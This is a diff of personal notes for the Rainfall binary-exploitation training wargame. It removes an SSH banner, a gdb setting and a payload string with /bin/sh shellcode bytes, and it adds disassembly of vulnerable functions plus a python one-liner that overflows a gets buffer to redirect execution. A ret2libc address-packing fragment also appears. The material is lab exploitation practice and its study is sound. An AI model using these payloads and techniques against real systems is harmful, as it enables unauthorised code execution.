@@ -1,46 +1,5 @@
 # Rainfall
 
-## TODO
-
-readme
-finish bonus0
-finish bonus2
-
-## Hard
-
-level5
-level9
-bonus0
-bonus2
-
-## Infos
-
-Port forwarding and shit
-
-```
-$ ssh -p 24242 level5@localhost
-          _____       _       ______    _ _ 
-         |  __ \     (_)     |  ____|  | | |
-         | |__) |__ _ _ _ __ | |__ __ _| | |
-         |  _  /  _` | | '_ \|  __/ _` | | |
-         | | \ \ (_| | | | | | | | (_| | | |
-         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
-
-                 Good luck & Have fun
-
-  To start, ssh with level0/level0 on 10.0.2.15:4242
-level0@127.0.0.1's password: 
-  GCC stack protector support:            Enabled
-  Strict user copy checks:                Disabled
-  Restrict /dev/mem access:               Enabled
-  Restrict /dev/kmem access:              Enabled
-  grsecurity / PaX: No GRKERNSEC
-  Kernel Heap Hardening: No KERNHEAP
- System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/level0/level0
-```
-
 ## tools
 
 - `scp -P 24242 levelX@localhost:/home/user/levelX/levelX .`
@@ -51,16 +10,6 @@ No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RU
 - `readelf -a <executable>`
 - `objdump -M intel -d <executable>`
 - `(echo -e "set disassembly-flavor intel\nset pagination off"; cat) | gdb <executable>`
-
-## for gdb
-
-```
-(gdb) set disassembly-flavor intel
-```
-
-abcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcd0x08048444
-
-abcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcd\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
 
 ## level0
 
@@ -130,6 +79,23 @@ $ cat /home/user/level2/.pass
 
 Why jump to "\x44\x84\x04\x08" (in reverse)? (address of `run` function)
 76 why????
+
+```
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   ebp
+   0x08048481 <+1>:	mov    ebp,esp
+=> 0x08048483 <+3>:	and    esp,0xfffffff0
+   0x08048486 <+6>:	sub    esp,0x50
+   0x08048489 <+9>:	lea    eax,[esp+0x10]
+   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave  
+   0x08048496 <+22>:	ret 
+```
+
+`0x08048444  run`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+python -c "print('\x90' * 60 + 'A' * 16 + '\x44\x84\x04\x08')" | ./level1
 
 ## level2
 
@@ -349,6 +315,53 @@ systemAddress = struct.pack("I", 0xb7e6b060)   # Address of system
 shellAddress = struct.pack("I", 0xbffff93b)
 #shellAddress = struct.pack("I", 0xbffff93f)    # shell adress without LOL     
 #shellAddress = struct.pack("I", 0xbfffffbf)    # Address that points to /bin/sh$
+```
+
+```
+Dump of assembler code for function main:
+   0x0804853f <+0>:	push   ebp
+   0x08048540 <+1>:	mov    ebp,esp
+=> 0x08048542 <+3>:	and    esp,0xfffffff0
+   0x08048545 <+6>:	call   0x80484d4 <p>
+   0x0804854a <+11>:	leave  
+   0x0804854b <+12>:	ret    
+End of assembler dump.
+```
+
+```
+Dump of assembler code for function p:
+   0x080484d4 <+0>:	push   ebp
+   0x080484d5 <+1>:	mov    ebp,esp
+   0x080484d7 <+3>:	sub    esp,0x68
+=> 0x080484da <+6>:	mov    eax,ds:0x8049860
+   0x080484df <+11>:	mov    DWORD PTR [esp],eax
+   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
+   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
+   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
+   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
+   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080484fb <+39>:	and    eax,0xb0000000
+   0x08048500 <+44>:	cmp    eax,0xb0000000
+   0x08048505 <+49>:	jne    0x8048527 <p+83>
+   0x08048507 <+51>:	mov    eax,0x8048620
+   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
+   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
+   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
+---Type <return> to continue, or q <return> to quit---
+   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
+   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
+   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
+   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
+   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
+   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
+   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
+   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
+   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:	leave  
+   0x0804853e <+106>:	ret    
+End of assembler dump.
 ```
 
 
